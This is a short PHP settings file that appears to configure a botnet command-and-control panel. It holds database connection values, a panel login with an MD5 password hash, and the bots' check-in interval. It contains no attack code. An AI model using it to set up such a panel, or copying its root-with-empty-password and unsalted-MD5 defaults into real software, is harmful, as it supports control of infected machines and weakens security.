<?php
  //$sHost should be the MYSQL host of the database, by default localhost
  $sHost           	= "localhost";
  
  //$sUser should be the user of the database
  $sUser 			= "root";
  
  //$sPass should be the password of the database user supplied before
  $sPass 			= "";
  
  //$sDatabase should be the database name where the tables should be installed in
  $sDatabase 		= "server2go";
  
  //$sPanelUsername should be the username you want to login to the panel
  $sPanelUsername 	= "Solar1";
  
  //$sPanelPassword should be the password you want to login to the panel
  //this password should be in MD5 (http://www.md5.cz/)
  $sPanelPassword 	= "352ccd39c4ed093da3690db82cca8ca0"; //MD5(Password)
  
  //$dwSecondsOnline is the knock time for the bots in seconds. 
  //You can adjust this and the bots will use the new knock time
  $dwSecondsOnline 	= 10;
  
  //How many records you want to be shown per page
  $dwRecords		= 10;
?>
